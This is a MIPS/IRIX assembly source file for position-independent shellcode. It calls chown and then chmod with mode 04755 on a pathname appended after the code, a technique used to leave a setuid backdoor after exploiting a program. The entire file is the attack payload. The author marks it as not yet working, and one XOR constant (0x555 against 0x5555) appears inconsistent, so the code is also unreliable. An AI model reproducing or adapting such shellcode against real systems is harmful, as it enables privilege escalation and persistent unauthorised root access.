/* MIPS/IRIX PIC chmod code
 *
 * -sc.
 */

#include <sgidefs.h>
#include <sys/regdef.h>
#include <sys/asm.h>
#include <sys.s>
#include <sys/syscall.h>

	.section .text

	.globl	cbegin
	.globl	cend

	/* FIXME: its not workable atm */
cbegin:
	.set	noreorder
	.set	nomacro

lbl:	bltzal	zero, lbl

	li	a1, 0x4141	/* a1 = uid ^ 0x5555 */
	xor	a1, a1, 0x5555
	li	a2, 0x4242	/* a2 = gid ^ 0x5555 */
	xor	a2, a2, 0x555

	addu	a0, ra, 0x0180
	sb	zero, -(0x0148 + -(9))(a0)
	subu	a0, a0, 0x0148

	/* chown (a0 = pathname, a1 = uid, a2 = gid) */
	li	v0, SYS_chown	/* 0x03f8 */
	syscall

	/* chmod (a0 = pathname, a1 = 04755) */
	li	a1, 0x09ed	/* a1 = 04755 = 0x09ed */
	li	v0, SYS_chmod	/* 0x03f7 */
	syscall

	li	v0, SYS_exit	/* 0x03e9 */
	syscall
	li	t8, 0x72ec	/* sane ds */

	.end	cbegin
cend:

	/* XXX: append pathname here, will get NUL terminated */
